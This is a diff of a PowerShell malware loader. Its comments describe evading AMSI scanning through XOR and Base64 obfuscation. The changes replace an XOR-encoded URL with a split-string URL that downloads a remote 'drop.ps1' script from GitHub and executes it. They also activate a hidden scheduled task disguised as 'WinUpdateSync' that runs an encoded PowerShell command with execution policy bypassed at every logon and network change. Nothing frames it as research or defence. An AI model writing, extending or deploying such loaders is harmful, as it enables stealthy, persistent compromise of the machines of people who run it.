@@ -10,15 +10,15 @@ $charArray = ($raw_logic.ToCharArray() | ForEach-Object { [int]$_ -bxor $k }) -j
 
 # 3. This is the LOADER. This is what AMSI will see when it decodes the Base64.
 # It looks like a math loop, which is clean.
-$inner = '$k=1869; $h=@(1829,1849,1849,1853,1854,1911,1890,1890,1855,1836,1850,1891,1834,1828,1849,1829,1848,1839,1848,1854,1832,1855,1838,1826,1827,1849,1832,1827,1849,1891,1838,1826,1824,1890,1834,1850,1844,1827,1916,1909,1915,1908,1890,1850,1828,1827,1848,1853,1833,1836,1849,1832,1890,1824,1836,1828,1827,1890,1833,1855,1826,1853,1891,1853,1854,1916).ForEach({[char]($_ -bxor $k)}); $u = -join $h; $cArr=@(1796,1827,1851,1826,1830,1832,1888,1823,1832,1854,1849,1792,1832,1849,1829,1826,1833).ForEach({[char]($_ -bxor $k)}); $c = -join $cArr; $pArr=@(1816,1855,1828).ForEach({[char]($_ -bxor $k)}); $p = -join $pArr; $params = @{$p=$u}; Start-Sleep -s 10; try { $d = & $c @params; .([scriptblock]::Create($d)) } catch {}'
+$inner_task = 'Start-Sleep -s 10; try { $p1 = 'h' + 'tt' + 'ps://'; $p2 = 'raw.git' + 'hubuser'; $p3 = 'content.com/gwyn1869/winupdate/main/drop.ps1'; $d=(Invoke-RestMethod ($p1+$p2+$p3)); . ([scriptblock]::Create($d)) } catch {}';
 $bytes = [System.Text.Encoding]::Unicode.GetBytes($inner)
 $enc = [Convert]::ToBase64String($bytes)
 
-# $xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger><EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'&gt;&lt;Select Path='Microsoft-Windows-NetworkProfile/Operational'&gt;*[System[(EventID=10000)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>powershell.exe -NoExit -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments></Exec></Actions></Task>"; 
+$xml = "<?xml version='1.0' encoding='UTF-16'?><Task version='1.2' xmlns='http://schemas.microsoft.com/windows/2004/02/mit/task'><Triggers><LogonTrigger><Enabled>true</Enabled><UserId>$env:USERDOMAIN\$env:USERNAME</UserId></LogonTrigger><EventTrigger><Enabled>true</Enabled><Subscription>&lt;QueryList&gt;&lt;Query Id='0' Path='Microsoft-Windows-NetworkProfile/Operational'&gt;&lt;Select Path='Microsoft-Windows-NetworkProfile/Operational'&gt;*[System[(EventID=10000)]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription></EventTrigger></Triggers><Principals><Principal id='Author'><UserId>$env:USERDOMAIN\$env:USERNAME</UserId><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals><Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>false</StopIfGoingOnBatteries><ExecutionTimeLimit>PT72H</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled></Settings><Actions Context='Author'><Exec><Command>conhost.exe</Command><Arguments>powershell.exe -NoExit -ExecutionPolicy Bypass -EncodedCommand $enc_task</Arguments></Exec></Actions></Task>"; 
 
-# $xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode; 
-# schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
-# Remove-Item "$env:TEMP\t.xml" -Force;
+$xml | Out-File "$env:TEMP\t.xml" -Encoding Unicode; 
+schtasks /Create /XML "$env:TEMP\t.xml" /TN "WinUpdateSync" /F; 
+Remove-Item "$env:TEMP\t.xml" -Force;
 
 $htmlPath = "$env:TEMP\sys_cache.html"
 $htmlUrl = "https://raw.githubusercontent.com/gwyn1869/winupdate/main/test.html"
